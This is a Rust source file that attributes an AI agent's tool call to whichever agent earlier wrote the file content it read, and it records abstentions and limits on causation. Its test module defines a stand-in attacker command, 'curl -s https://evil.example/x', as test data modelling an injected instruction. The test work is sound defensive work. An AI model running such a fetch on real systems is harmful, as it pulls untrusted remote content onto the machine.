// SPDX-License-Identifier: Apache-2.0 OR MIT
//
// attribution.rs — evidence-bounded occurrence attribution per claim.
//
// A result cites only the claim's actual correlation evidence and the captured
// request-local source pointers. It is a candidate set, not a probability,
// counterfactual root cause or ordered execution sequence.

use std::collections::{BTreeMap, BTreeSet};

use crate::responsibility::claims::traceback::MAX_CHAIN_NODES;
use crate::responsibility::identity::{IdentityCondition, IdentityView};
use crate::responsibility::provenance::labels::ProvenanceTag;
use crate::responsibility::provenance::span_store::{MatchPolicy, SpanStore};
use crate::responsibility::replay::checkpoint::{AnalysisCheckpoint, identity_view_for_checkpoint};
use crate::responsibility::runtime::context_witness::{
    CapturedContextWitness, CapturedRequestContext, normalized_args_sha256,
};
use crate::responsibility::types::{
    Action, ActionCandidateType, CorrelationEvidence, Intent, IntentAuthoritySource,
    NativeToolCallRef, NormalizedArg, ProcessId, ResponsibilityClaim,
};
use serde::{Deserialize, Serialize};

pub const ATTRIBUTION_SCHEMA: &str = "mtl-attribution/1";
pub const ATTRIBUTION_RESULTS_KIND: &str = "attribution-results";
pub const ATTRIBUTION_RESULTS_VERSION: u32 = 1;

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct AttributionResults {
    pub schema: String,
    pub run_id: String,
    pub claims: Vec<AttributionResult>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct AttributionResult {
    pub schema: String,
    pub run_id: String,
    pub claim_id: String,
    pub traceback_ref: Option<String>,
    pub executors: Vec<ExecutorRef>,
    pub occurrences: Vec<OccurrenceNode>,
    pub edges: Vec<TypedEdge>,
    pub source_entry_candidates: Vec<SourceEntryCandidate>,
    pub unique_entry: Option<String>,
    pub root_groups: Vec<RootCandidateGroup>,
    pub ranked_agents: Option<Vec<String>>,
    pub abstentions: Vec<AttributionAbstention>,
    pub limitations: Vec<String>,
    pub truncated: bool,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ExecutorRef {
    pub actor: String,
    pub unit_id: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct OccurrenceNode {
    pub node_id: String,
    pub kind: String,
    pub intent_id: Option<String>,
    pub action_id: Option<String>,
    pub message_id: Option<String>,
    pub process: Option<ProcessId>,
    pub json_pointer: Option<String>,
    pub native_ref: Option<NativeToolCallRef>,
    pub observed_at_ns: Option<u64>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct TypedEdge {
    pub edge_id: String,
    pub edge_type: String,
    pub source: String,
    pub target: String,
    pub support_refs: Vec<String>,
    pub evidence_id: Option<String>,
    pub match_level: Option<String>,
    pub outcome: Option<String>,
    pub observed_not_after: bool,
    pub note: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SourceEntryCandidate {
    pub node_id: String,
    pub message_id: String,
    pub process: ProcessId,
    pub json_pointer: String,
    pub source_text_sha256: String,
    pub source_native_ref: Option<NativeToolCallRef>,
    pub matched_line: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct RootCandidateGroup {
    pub evidence_tier: String,
    pub actors: Vec<String>,
    pub readers: Vec<ReaderSupport>,
    pub writers: Vec<WriterSupport>,
    pub support_refs: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ReaderSupport {
    pub actor: String,
    pub intent_id: String,
    pub action_id: String,
    pub path: String,
    pub evidence_id: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct WriterSupport {
    pub actor: String,
    pub intent_id: String,
    pub action_id: String,
    pub path: String,
    pub evidence_id: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct AttributionAbstention {
    pub code: String,
    pub reason: String,
}

pub struct AttributionBuilder;

impl AttributionBuilder {
    /// Build one bounded result per claim after claims and tracebacks exist.
    pub fn build(
        checkpoint: &AnalysisCheckpoint,
        claims: &[ResponsibilityClaim],
    ) -> AttributionResults {
        let view = identity_view_for_checkpoint(checkpoint, IdentityCondition::Full).ok();
        AttributionResults {
            schema: ATTRIBUTION_SCHEMA.to_string(),
            run_id: checkpoint.run_id.clone(),
            claims: claims
                .iter()
                .map(|claim| build_claim(checkpoint, claim, view.as_ref()))
                .collect(),
        }
    }
}

fn empty_result(checkpoint: &AnalysisCheckpoint) -> AttributionResult {
    AttributionResult {
        schema: ATTRIBUTION_SCHEMA.to_string(),
        run_id: checkpoint.run_id.clone(),
        claim_id: String::new(),
        traceback_ref: None,
        executors: Vec::new(),
        occurrences: Vec::new(),
        edges: Vec::new(),
        source_entry_candidates: Vec::new(),
        unique_entry: None,
        root_groups: Vec::new(),
        ranked_agents: None,
        abstentions: Vec::new(),
        limitations: Vec::new(),
        truncated: false,
    }
}

fn build_claim(
    checkpoint: &AnalysisCheckpoint,
    claim: &ResponsibilityClaim,
    view: Option<&IdentityView>,
) -> AttributionResult {
    let mut result = empty_result(checkpoint);
    result.claim_id = claim.claim_id.as_str().to_string();
    result.traceback_ref = claim
        .traceback_ref
        .as_ref()
        .map(|traceback| traceback.0.clone());
    result.limitations = vec![
        "unobserved file version or intermediate writers remain possible".into(),
        "inferred identity is not authentication".into(),
        "a root candidate is not a proven counterfactual cause".into(),
    ];

    let mut occurrences: BTreeMap<String, OccurrenceNode> = BTreeMap::new();
    let mut edges: BTreeMap<String, TypedEdge> = BTreeMap::new();
    let mut executors: BTreeMap<(String, String), ExecutorRef> = BTreeMap::new();
    let mut sources: BTreeMap<String, SourceEntryCandidate> = BTreeMap::new();
    let mut abstentions: Vec<AttributionAbstention> = Vec::new();

    if view.is_none() {
        record_abstention(
            &mut abstentions,
            "identity_unavailable",
            "checkpoint has no usable frozen PRE-resolver identity input and policy".into(),
        );
    }

    // ── Only evidence the claim actually cites, with both real endpoints ──
    let mut target_intents: Vec<Intent> = Vec::new();
    let mut dangling = false;
    for evidence in &checkpoint.evidence {
        if !claim.evidence_refs.contains(&evidence.evidence_id) {
            continue;
        }
        let Some(intent) = checkpoint
            .intents
            .iter()
            .find(|intent| intent.intent_id == evidence.intent_id)
        else {
            dangling = true;
            record_abstention(
                &mut abstentions,
                "dangling_evidence",
                format!(
                    "cited evidence {} has no intent {}",
                    evidence.evidence_id.as_str(),
                    evidence.intent_id.as_str()
                ),
            );
            continue;
        };
        let Some(action) = checkpoint
            .actions
            .iter()
            .find(|action| action.action_id == evidence.action_id)
        else {
            dangling = true;
            record_abstention(
                &mut abstentions,
                "dangling_evidence",
                format!(
                    "cited evidence {} has no action {}",
                    evidence.evidence_id.as_str(),
                    evidence.action_id.as_str()
                ),
            );
            continue;
        };
        insert_occurrence(&mut occurrences, intent_occurrence(intent));
        insert_occurrence(&mut occurrences, action_occurrence(action));
        insert_edge(
            &mut edges,
            correlation_edge(evidence, intent, action, &mut abstentions),
        );
        if let Some(actor) =
            view.and_then(|view| actor_for(view, "action", action.action_id.as_str()))
        {
            let unit_id = format!("action:{}", action.action_id.as_str());
            executors
                .entry((actor.clone(), unit_id.clone()))
                .or_insert(ExecutorRef { actor, unit_id });
        } else if view.is_some() {
            record_abstention(
                &mut abstentions,
                "executor_identity_unavailable",
                "the cited executor action has no unique Full actor".into(),
            );
        }
        target_intents.push(intent.clone());
    }
    target_intents.sort_by(|left, right| left.intent_id.as_str().cmp(right.intent_id.as_str()));
    target_intents.dedup_by(|left, right| left.intent_id == right.intent_id);
    if target_intents.is_empty() && !dangling {
        record_abstention(
            &mut abstentions,
            "citation_unavailable",
            "the claim cites no existing correlation evidence with actual endpoints".into(),
        );
    }

    let contexts = checkpoint.captured_request_contexts.as_deref();
    if contexts.is_none() {
        record_abstention(
            &mut abstentions,
            "captured_context_unavailable",
            "the checkpoint has no frozen captured request contexts".into(),
        );
    }

    let mut readers: BTreeMap<(String, String, String), ReaderSupport> = BTreeMap::new();
    let mut writers: BTreeMap<(String, String, String), WriterSupport> = BTreeMap::new();
    let mut writer_actors: BTreeSet<String> = BTreeSet::new();
    let mut root_refs: BTreeSet<String> = BTreeSet::new();

    for target in &target_intents {
        if !is_strong_native(target) {
            record_abstention(
                &mut abstentions,
                "target_source_unsupported",
                "text fallback or asserted content cannot borrow a native source witness".into(),
            );
            continue;
        }
        let mut matched_context = false;
        for context in contexts.unwrap_or(&[]) {
            if context.process != target.process_id {
                continue;
            }
            if context.message_id != target.message_id && view.is_none() {
                continue;
            }
            if context.run_id != checkpoint.run_id {
                record_abstention(
                    &mut abstentions,
                    "inconsistent_run",
                    format!(
                        "captured context for message {} belongs to run {}",
                        context.message_id.as_str(),
                        context.run_id
                    ),
                );
                continue;
            }
            matched_context = true;
            if context.source_truncation_count > 0 {
                result.truncated = true;
                record_abstention(
                    &mut abstentions,
                    "source_truncated",
                    "captured sources omitted alternatives; unique attribution is unavailable"
                        .into(),
                );
            }

            let Some(target_native) = target.native_tool_call.as_ref() else {
                continue;
            };
            let mut matching_witnesses: Vec<&CapturedContextWitness> = Vec::new();
            let mut signatures: BTreeSet<(String, String)> = BTreeSet::new();
            for witness in &context.witnesses {
                if witness.source_message_index >= witness.target_message_index {
                    record_abstention(
                        &mut abstentions,
                        "future_source",
                        "a source witness cannot follow or equal its target index".into(),
                    );
                    continue;
                }
                if witness.target_native_ref != *target_native {
                    continue;
                }
                signatures.insert((
                    witness.target_tool_name.clone(),
                    witness.target_args_sha256.clone(),
                ));
                matching_witnesses.push(witness);
            }
            if matching_witnesses.is_empty() {
                continue;
            }
            if signatures.len() > 1 {
                record_abstention(
                    &mut abstentions,
                    "invocation_signature_ambiguous",
                    "one native id carries multiple captured invocation signatures".into(),
                );
                continue;
            }
            let expected = (
                target.tool_name.clone(),
                normalized_args_sha256(&target.tool_args),
            );
            if signatures.first() != Some(&expected) {
                record_abstention(
                    &mut abstentions,
                    "invocation_signature_mismatch",
                    "captured witness does not match the claim intent's native name/args digest"
                        .into(),
                );
                continue;
            }

            let message_actor =
                view.and_then(|view| actor_for(view, "message", context.message_id.as_str()));
            if view.is_some() {
                let target_actor =
                    view.and_then(|view| actor_for(view, "intent", target.intent_id.as_str()));
                if message_actor.is_none() || message_actor != target_actor {
                    record_abstention(
                        &mut abstentions,
                        "target_actor_unavailable",
                        "captured context message and target intent have no shared Full actor"
                            .into(),
                    );
                    continue;
                }
            }

            if context.message_id != target.message_id {
                let limitation =
                    "native-call co-reference links observations, not distinct executions"
                        .to_string();
                if !result.limitations.contains(&limitation) {
                    result.limitations.push(limitation);
                }
            }
            for witness in matching_witnesses {
                let source_node =
                    source_node_id(context.message_id.as_str(), &witness.source_json_pointer);
                insert_occurrence(
                    &mut occurrences,
                    OccurrenceNode {
                        node_id: source_node.clone(),
                        kind: "captured_source".into(),
                        intent_id: None,
                        action_id: None,
                        message_id: Some(context.message_id.as_str().to_string()),
                        process: Some(context.process),
                        json_pointer: Some(witness.source_json_pointer.clone()),
                        native_ref: witness.source_native_ref.clone(),
                        observed_at_ns: Some(context.observed_at_ns),
                    },
                );
                sources
                    .entry(source_node.clone())
                    .or_insert_with(|| SourceEntryCandidate {
                        node_id: source_node.clone(),
                        message_id: context.message_id.as_str().to_string(),
                        process: context.process,
                        json_pointer: witness.source_json_pointer.clone(),
                        source_text_sha256: witness.source_text_sha256.clone(),
                        source_native_ref: witness.source_native_ref.clone(),
                        matched_line: witness.matched_line.clone(),
                    });
                insert_edge(
                    &mut edges,
                    TypedEdge {
                        edge_id: format!(
                            "reuse:{}:{}:{}",
                            context.message_id.as_str(),
                            witness.source_json_pointer,
                            target.intent_id.as_str()
                        ),
                        edge_type: "request_history_text_reuse".into(),
                        source: source_node.clone(),
                        target: format!("intent:{}", target.intent_id.as_str()),
                        support_refs: vec![
                            format!("source_sha256:{}", witness.source_text_sha256),
                            format!("source_pointer:{}", witness.source_json_pointer),
                            format!("matched_line:{}", witness.matched_line),
                            format!(
                                "protocol_order:{}<{}",
                                witness.source_message_index, witness.target_message_index
                            ),
                        ],
                        evidence_id: None,
                        match_level: None,
                        outcome: None,
                        observed_not_after: false,
                        note: Some("declared history order; observed-time order and causation are unproven".into()),
                    },
                );

                let Some(view) = view else { continue };
                let Some(target_actor) = message_actor.clone() else {
                    continue;
                };
                match infer_root(checkpoint, view, context, target, witness, &target_actor) {
                    Ok(resolution) => {
                        for (intent, action, evidence) in &resolution.readers {
                            insert_occurrence(&mut occurrences, intent_occurrence(intent));
                            insert_occurrence(&mut occurrences, action_occurrence(action));
                            insert_edge(
                                &mut edges,
                                correlation_edge(evidence, intent, action, &mut abstentions),
                            );
                            readers
                                .entry((
                                    resolution.read_actor.clone(),
                                    intent.intent_id.as_str().to_string(),
                                    action.action_id.as_str().to_string(),
                                ))
                                .or_insert_with(|| ReaderSupport {
                                    actor: resolution.read_actor.clone(),
                                    intent_id: intent.intent_id.as_str().to_string(),
                                    action_id: action.action_id.as_str().to_string(),
                                    path: resolution.path.clone(),
                                    evidence_id: evidence.evidence_id.as_str().to_string(),
                                });
                            root_refs.insert(format!("evidence:{}", evidence.evidence_id.as_str()));
                            root_refs.insert(format!("path:{}", resolution.path));
                        }
                        if resolution.readers.is_empty() {
                            record_abstention(
                                &mut abstentions,
                                "reader_action_unavailable",
                                "no successful non-empty same-reader FileRead supports the source Read"
                                    .into(),
                            );
                        }
                        for (intent, action, evidence) in &resolution.writers {
                            insert_occurrence(&mut occurrences, intent_occurrence(intent));
                            insert_occurrence(&mut occurrences, action_occurrence(action));
                            insert_edge(
                                &mut edges,
                                correlation_edge(evidence, intent, action, &mut abstentions),
                            );
                            let actor = actor_for(view, "intent", intent.intent_id.as_str())
                                .unwrap_or_else(|| resolution.read_actor.clone());
                            writers
                                .entry((
                                    actor.clone(),
                                    intent.intent_id.as_str().to_string(),
                                    action.action_id.as_str().to_string(),
                                ))
                                .or_insert_with(|| WriterSupport {
                                    actor: actor.clone(),
                                    intent_id: intent.intent_id.as_str().to_string(),
                                    action_id: action.action_id.as_str().to_string(),
                                    path: resolution.path.clone(),
                                    evidence_id: evidence.evidence_id.as_str().to_string(),
                                });
                            writer_actors.insert(actor);
                            root_refs.insert(format!("evidence:{}", evidence.evidence_id.as_str()));
                            root_refs
                                .insert(format!("writer_intent:{}", intent.intent_id.as_str()));
                            root_refs
                                .insert(format!("writer_action:{}", action.action_id.as_str()));
                            let writer_action_node =
                                format!("action:{}", action.action_id.as_str());
                            if !path_exists(&edges, &source_node, &writer_action_node) {
                                insert_edge(
                                    &mut edges,
                                    TypedEdge {
                                        edge_id: format!(
                                            "writer-candidate:{}:{}",
                                            action.action_id.as_str(),
                                            source_node
                                        ),
                                        edge_type: "writer_source_candidate".into(),
                                        source: writer_action_node,
                                        target: source_node.clone(),
                                        support_refs: vec![
                                            format!("evidence:{}", evidence.evidence_id.as_str()),
                                            format!("path:{}", resolution.path),
                                            format!(
                                                "reader_action:{}",
                                                resolution.read_action_ids.join(",")
                                            ),
                                            format!(
                                                "observed_not_after:{}<={}",
                                                action.timestamp_ns, resolution.read_cutoff_ns
                                            ),
                                            format!("matched_line:{}", witness.matched_line),
                                        ],
                                        evidence_id: Some(
                                            evidence.evidence_id.as_str().to_string(),
                                        ),
                                        match_level: Some(format!("{:?}", evidence.match_level)),
                                        outcome: Some(action.outcome.as_str().into()),
                                        observed_not_after: true,
                                        note: Some(
                                            "writer source candidate, not proven causal dependency"
                                                .into(),
                                        ),
                                    },
                                );
                            } else {
                                record_abstention(
                                    &mut abstentions,
                                    "inconsistent_timing",
                                    "writer candidate edge would create an incompatible cycle"
                                        .into(),
                                );
                            }
                        }
                        if resolution.writers.is_empty()
                            && writers.is_empty()
                            && let Some((code, reason)) = resolution.root_abstention
                        {
                            record_abstention(&mut abstentions, &code, reason);
                        }
                    }
                    Err((code, reason)) => {
                        record_abstention(&mut abstentions, &code, reason);
                    }
                }
            }
        }
        if !matched_context && contexts.is_some() {
            record_abstention(
                &mut abstentions,
                "context_for_target_unavailable",
                format!(
                    "no captured request context for target intent {}",
                    target.intent_id.as_str()
                ),
            );
        }
    }

    if writers.is_empty() {
        result.ranked_agents = None;
        if !abstentions.iter().any(|abstention| {
            matches!(
                abstention.code.as_str(),
                "root_unknown"
                    | "reader_action_unavailable"
                    | "source_read_unavailable"
                    | "source_read_ambiguous"
                    | "source_ref_unavailable"
            )
        }) {
            record_abstention(
                &mut abstentions,
                "root_unknown",
                "no supported observed file producer; executor is not the root".into(),
            );
        }
    } else {
        let actors: Vec<String> = writer_actors.iter().cloned().collect();
        result.ranked_agents = (actors.len() == 1).then(|| actors.clone());
        result.root_groups.push(RootCandidateGroup {
            evidence_tier: "writer_source_candidate".into(),
            actors,
            readers: readers.values().cloned().collect(),
            writers: writers.values().cloned().collect(),
            support_refs: root_refs.iter().cloned().collect(),
        });
    }

    result.occurrences = occurrences.into_values().collect();
    result.edges = edges.into_values().collect();
    result.executors = executors.into_values().collect();
    result.source_entry_candidates = sources.into_values().collect();
    result.unique_entry = (result.source_entry_candidates.len() == 1)
        .then(|| result.source_entry_candidates[0].node_id.clone());
    result.abstentions = abstentions;

    let bounded = result
        .occurrences
        .len()
        .max(result.edges.len())
        .max(result.source_entry_candidates.len());
    if bounded > MAX_CHAIN_NODES {
        result.truncated = true;
        result.occurrences.truncate(MAX_CHAIN_NODES);
        result.edges.truncate(MAX_CHAIN_NODES);
        let retained: BTreeSet<_> = result
            .occurrences
            .iter()
            .map(|node| node.node_id.as_str())
            .collect();
        result.edges.retain(|edge| {
            retained.contains(edge.source.as_str()) && retained.contains(edge.target.as_str())
        });
        result
            .executors
            .retain(|executor| retained.contains(executor.unit_id.as_str()));
        result
            .source_entry_candidates
            .retain(|source| retained.contains(source.node_id.as_str()));
        result.source_entry_candidates.truncate(MAX_CHAIN_NODES);
        result.unique_entry = (result.source_entry_candidates.len() == 1)
            .then(|| result.source_entry_candidates[0].node_id.clone());
        result.root_groups.clear();
        result.ranked_agents = None;
        record_abstention(
            &mut result.abstentions,
            "chain_truncated",
            format!("attribution exceeded the existing {MAX_CHAIN_NODES}-node traceback bound"),
        );
    }
    if result.truncated {
        result.ranked_agents = None;
        result.unique_entry = None;
    }
    result
}

struct RootResolution {
    path: String,
    read_actor: String,
    readers: Vec<(Intent, Action, CorrelationEvidence)>,
    writers: Vec<(Intent, Action, CorrelationEvidence)>,
    read_action_ids: Vec<String>,
    read_cutoff_ns: u64,
    root_abstention: Option<(String, String)>,
}

fn infer_root(
    checkpoint: &AnalysisCheckpoint,
    view: &IdentityView,
    context: &CapturedRequestContext,
    target: &Intent,
    witness: &CapturedContextWitness,
    target_actor: &str,
) -> Result<RootResolution, (String, String)> {
    let Some(source_ref) = witness.source_native_ref.as_ref() else {
        return Err((
            "source_ref_unavailable".into(),
            "captured source witness has no native call reference".into(),
        ));
    };
    let read_intents: Vec<&Intent> = checkpoint
        .intents
        .iter()
        .filter(|intent| intent.native_tool_call.as_ref() == Some(source_ref))
        .collect();
    if read_intents.is_empty() {
        return Err((
            "source_read_unavailable".into(),
            "no captured Read intent carries the source native call reference".into(),
        ));
    }
    for intent in &read_intents {
        if intent.tool_name != "Read"
            || !is_strong_native(intent)
            || intent.process_id != context.process
            || actor_for(view, "intent", intent.intent_id.as_str()).as_deref() != Some(target_actor)
        {
            return Err((
                "source_read_ambiguous".into(),
                "source native reference maps to differing tools, processes or actors".into(),
            ));
        }
    }
    let paths: BTreeSet<Option<String>> = read_intents
        .iter()
        .map(|intent| complete_intent_path(intent))
        .collect();
    if paths.len() != 1 {
        return Err((
            "source_read_ambiguous".into(),
            "source native reference maps to differing normalized paths".into(),
        ));
    }
    let Some(path) = paths.into_iter().next().flatten() else {
        return Err((
            "source_read_ambiguous".into(),
            "source Read path is relative, incomplete, parent-directed or unresolved".into(),
        ));
    };

    let read_ids: BTreeSet<&str> = read_intents
        .iter()
        .map(|intent| intent.intent_id.as_str())
        .collect();
    let mut readers = Vec::new();
    for evidence in &checkpoint.evidence {
        if !read_ids.contains(evidence.intent_id.as_str()) {
            continue;
        }
        let Some(action) = checkpoint
            .actions
            .iter()
            .find(|action| action.action_id == evidence.action_id)
        else {
            continue;
        };
        if action.action_type != ActionCandidateType::FileRead
            || complete_action_path(action).as_deref() != Some(path.as_str())
            || !action.outcome.is_success()
            || action.syscall_ret.unwrap_or(0) <= 0
            || action.timestamp_ns == 0
            || action.timestamp_ns > context.observed_at_ns
        {
            continue;
        }
        let Some(action_actor) = actor_for(view, "action", action.action_id.as_str()) else {
            continue;
        };
        if action_actor != target_actor {
            continue;
        }
        let Some(intent) = read_intents
            .iter()
            .find(|intent| intent.intent_id == evidence.intent_id)
        else {
            continue;
        };
        readers.push(((*intent).clone(), action.clone(), evidence.clone()));
    }
    if readers.is_empty() {
        return Err((
            "reader_action_unavailable".into(),
            "no successful non-empty same-reader FileRead supports the source Read".into(),
        ));
    }
    readers.sort_by(|left, right| left.1.action_id.as_str().cmp(right.1.action_id.as_str()));
    readers.dedup_by(|left, right| left.1.action_id == right.1.action_id);
    let read_cutoff_ns = readers
        .iter()
        .map(|(_, action, _)| action.timestamp_ns)
        .min()
        .unwrap_or(0);
    let read_action_ids = readers
        .iter()
        .map(|(_, action, _)| action.action_id.as_str().to_string())
        .collect();

    let mut writers = Vec::new();
    for intent in &checkpoint.intents {
        if intent.tool_name != "Write" || !is_strong_native(intent) {
            continue;
        }
        let Some(writer_actor) = actor_for(view, "intent", intent.intent_id.as_str()) else {
            continue;
        };
        if complete_intent_path(intent).as_deref() != Some(path.as_str()) {
            continue;
        }
        if !content_reuses_line(checkpoint.run_id.as_str(), intent, &witness.matched_line) {
            continue;
        }
        for evidence in &checkpoint.evidence {
            if evidence.intent_id != intent.intent_id {
                continue;
            }
            let Some(action) = checkpoint
                .actions
                .iter()
                .find(|action| action.action_id == evidence.action_id)
            else {
                continue;
            };
            if !matches!(
                action.action_type,
                ActionCandidateType::FileWrite | ActionCandidateType::FileOverwrite
            ) || complete_action_path(action).as_deref() != Some(path.as_str())
                || !action.outcome.is_success()
                || action.syscall_ret.unwrap_or(0) <= 0
                || action.timestamp_ns == 0
                || action.timestamp_ns > read_cutoff_ns
            {
                continue;
            }
            if actor_for(view, "action", action.action_id.as_str()).as_deref()
                != Some(writer_actor.as_str())
            {
                continue;
            }
            writers.push((intent.clone(), action.clone(), evidence.clone()));
        }
    }
    writers.sort_by(|left, right| {
        left.1
            .action_id
            .as_str()
            .cmp(right.1.action_id.as_str())
            .then_with(|| left.0.intent_id.as_str().cmp(right.0.intent_id.as_str()))
    });
    writers.dedup_by(|left, right| {
        left.0.intent_id == right.0.intent_id && left.1.action_id == right.1.action_id
    });

    Ok(RootResolution {
        path,
        read_actor: target_actor.to_string(),
        readers,
        writers,
        read_action_ids,
        read_cutoff_ns,
        root_abstention: Some((
            "root_unknown".into(),
            format!(
                "no supported observed file producer writes {} with the matched content before the reader",
                target.intent_id.as_str()
            ),
        )),
    })
}

fn is_strong_native(intent: &Intent) -> bool {
    matches!(
        intent.authority_source,
        IntentAuthoritySource::RequestHistoryAssistantToolUse
            | IntentAuthoritySource::SseResponseToolUse
            | IntentAuthoritySource::HttpResponseToolUse
    )
}

fn content_reuses_line(run_id: &str, intent: &Intent, matched_line: &str) -> bool {
    let text = intent
        .tool_args
        .iter()
        .filter_map(|arg| match arg {
            NormalizedArg::Content(content) => Some(content.as_str()),
            _ => None,
        })
        .collect::<Vec<_>>()
        .join("\n");
    if text.is_empty() {
        return false;
    }
    let mut store = SpanStore::default();
    store.add(
        run_id,
        None,
        &format!("intent:{}", intent.intent_id.as_str()),
        &text,
        ProvenanceTag::retrieved_untrusted(false),
        intent.timestamp_ns,
    );
    !store
        .match_all_untrusted_with(run_id, matched_line, "", None, MatchPolicy::StrictRetrieved)
        .is_empty()
}

fn complete_intent_path(intent: &Intent) -> Option<String> {
    if intent
        .tool_args
        .iter()
        .any(|arg| matches!(arg, NormalizedArg::PathCaptureIncomplete { .. }))
    {
        return None;
    }
    let mut paths = intent.tool_args.iter().filter_map(|arg| match arg {
        NormalizedArg::Path(path) => Some(path.as_str()),
        _ => None,
    });
    let path = paths.next()?;
    if paths.next().is_some() {
        return None;
    }
    complete_absolute_path(path)
}

fn complete_action_path(action: &Action) -> Option<String> {
    if action
        .normalized_args
        .iter()
        .any(|arg| matches!(arg, NormalizedArg::PathCaptureIncomplete { .. }))
    {
        return None;
    }
    let mut paths = action.normalized_args.iter().filter_map(|arg| match arg {
        NormalizedArg::Path(path) => Some(path.as_str()),
        _ => None,
    });
    let path = paths.next()?;
    if paths.next().is_some() {
        return None;
    }
    complete_absolute_path(path)
}

fn complete_absolute_path(raw: &str) -> Option<String> {
    use std::path::{Component, Path};

    let path = Path::new(raw);
    if !path.is_absolute() {
        return None;
    }
    let mut normalized = std::path::PathBuf::new();
    for component in path.components() {
        match component {
            Component::RootDir => normalized.push("/"),
            Component::Normal(part) => normalized.push(part),
            Component::CurDir | Component::ParentDir | Component::Prefix(_) => return None,
        }
    }
    let value = normalized.to_string_lossy().into_owned();
    if value.is_empty() || value == "/" {
        return None;
    }
    if value.starts_with("/dev/fd/") || (value.starts_with("/proc/") && value.contains("/fd/")) {
        return None;
    }
    Some(value)
}

fn source_node_id(message_id: &str, pointer: &str) -> String {
    format!("source:{message_id}:{pointer}")
}

fn actor_for(view: &IdentityView, kind: &str, id: &str) -> Option<String> {
    let unit_id = format!("{kind}:{id}");
    view.units
        .iter()
        .find(|unit| unit.unit_id == unit_id)
        .and_then(|unit| unit.actor.partition().map(str::to_string))
}

fn intent_occurrence(intent: &Intent) -> OccurrenceNode {
    OccurrenceNode {
        node_id: format!("intent:{}", intent.intent_id.as_str()),
        kind: "intent".into(),
        intent_id: Some(intent.intent_id.as_str().to_string()),
        action_id: None,
        message_id: Some(intent.message_id.as_str().to_string()),
        process: Some(intent.process_id),
        json_pointer: None,
        native_ref: intent.native_tool_call.clone(),
        observed_at_ns: Some(intent.timestamp_ns),
    }
}

fn action_occurrence(action: &Action) -> OccurrenceNode {
    OccurrenceNode {
        node_id: format!("action:{}", action.action_id.as_str()),
        kind: "action".into(),
        intent_id: None,
        action_id: Some(action.action_id.as_str().to_string()),
        message_id: None,
        process: Some(action.process_id),
        json_pointer: None,
        native_ref: None,
        observed_at_ns: Some(action.timestamp_ns),
    }
}

fn correlation_edge(
    evidence: &CorrelationEvidence,
    intent: &Intent,
    action: &Action,
    abstentions: &mut Vec<AttributionAbstention>,
) -> TypedEdge {
    if intent.intent_id != evidence.intent_id || action.action_id != evidence.action_id {
        record_abstention(
            abstentions,
            "inconsistent_support",
            "correlation evidence endpoints changed after citation".into(),
        );
    }
    TypedEdge {
        edge_id: format!("correlation:{}", evidence.evidence_id.as_str()),
        edge_type: "intent_action_correlation".into(),
        source: format!("intent:{}", intent.intent_id.as_str()),
        target: format!("action:{}", action.action_id.as_str()),
        support_refs: vec![
            format!("evidence:{}", evidence.evidence_id.as_str()),
            format!("match_level:{:?}", evidence.match_level),
            format!("outcome:{}", action.outcome.as_str()),
        ],
        evidence_id: Some(evidence.evidence_id.as_str().to_string()),
        match_level: Some(format!("{:?}", evidence.match_level)),
        outcome: Some(action.outcome.as_str().to_string()),
        observed_not_after: intent.timestamp_ns > 0
            && action.timestamp_ns > 0
            && intent.timestamp_ns <= action.timestamp_ns,
        note: Some("correlation evidence, not proof of causation; false temporal flag means unproven or conflicting order".into()),
    }
}

fn insert_occurrence(occurrences: &mut BTreeMap<String, OccurrenceNode>, node: OccurrenceNode) {
    occurrences.entry(node.node_id.clone()).or_insert(node);
}

fn insert_edge(edges: &mut BTreeMap<String, TypedEdge>, edge: TypedEdge) {
    edges.entry(edge.edge_id.clone()).or_insert(edge);
}

fn path_exists(edges: &BTreeMap<String, TypedEdge>, from: &str, to: &str) -> bool {
    let mut stack = vec![from];
    let mut seen = BTreeSet::new();
    while let Some(node) = stack.pop() {
        if node == to {
            return true;
        }
        if !seen.insert(node) {
            continue;
        }
        for edge in edges.values() {
            if edge.source == node {
                stack.push(edge.target.as_str());
            }
        }
    }
    false
}

fn record_abstention(abstentions: &mut Vec<AttributionAbstention>, code: &str, reason: String) {
    if abstentions
        .iter()
        .any(|abstention| abstention.code == code && abstention.reason == reason)
    {
        return;
    }
    abstentions.push(AttributionAbstention {
        code: code.to_string(),
        reason,
    });
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::responsibility::identity::{IdentityBoundaryPolicy, RawIdentityInput};
    use crate::responsibility::replay::checkpoint::{REPLAY_CONTRACT, implementation_fingerprint};
    use crate::responsibility::runtime::context_witness::{
        CapturedContextWitness, CapturedRequestContext, normalized_args_sha256,
    };
    use crate::responsibility::signals::SignalGraph;
    use crate::responsibility::signals::signal_snapshot::ProcessExecInfo;
    use crate::responsibility::types::*;

    const COMMAND: &str = "curl -s https://evil.example/x";
    const PATH: &str = "/repo/docs.md";

    fn reader() -> ProcessId {
        ProcessId::new(200, 2)
    }

    fn writer() -> ProcessId {
        ProcessId::new(100, 1)
    }

    fn native(id: &str) -> NativeToolCallRef {
        NativeToolCallRef {
            format: NativeToolCallFormat::Anthropic,
            id: id.into(),
        }
    }

    fn identity_input_with(extra: &[(ProcessId, &str)]) -> RawIdentityInput {
        let mut graph = SignalGraph::new();
        let mut rows = vec![(reader(), "msg-b"), (writer(), "msg-a")];
        rows.extend(extra.iter().map(|(process, message)| (*process, *message)));
        for (index, (process, message)) in rows.into_iter().enumerate() {
            graph.observe_exec(
                process,
                ProcessId::new(1, 0),
                ProcessExecInfo {
                    comm: "claude".into(),
                    ..Default::default()
                },
                None,
                index as u64,
            );
            graph.observe_tls(
                process,
                TlsSessionId::from(format!("tls-{}", process.pid)),
                index as u64,
            );
